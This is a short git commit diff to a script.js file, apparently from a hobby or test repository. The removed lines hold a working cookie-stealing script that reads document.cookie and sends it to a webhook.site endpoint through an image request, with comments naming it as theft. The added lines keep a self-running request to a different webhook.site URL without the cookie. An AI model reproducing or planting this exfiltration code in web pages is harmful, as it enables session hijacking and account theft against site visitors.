814a2d12a24837748e285e72de480c224c10618d
dailybee13 <dailybee13@protonmail.com>
2025-04-18 18:32:38 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,13 +1,12 @@
 (function() {
-    // Function to steal cookies
-    function stealCookies() {
-        var cookie = document.cookie; // Get the document cookies
+    // Function to send a request
+    function sendRequest() {
         var image = new Image(); // Create a new Image object to send a request
 
-        // Send the cookie to your server (replace with your own endpoint)
-        image.src = 'https://webhook.site/1e59a9c8-2eb5-4c95-8bf0-fd1fd36f50a2/?c=' + encodeURIComponent(cookie);
+        // Send a request to your server (replace with your own endpoint)
+        image.src = 'http://webhook.site/9e44ad17-69df-4432-84e5-1f7c11ab05be';
     }
 
-    // Call the function to steal cookies
-    stealCookies();
+    // Call the function to send the request
+    sendRequest();
 })();
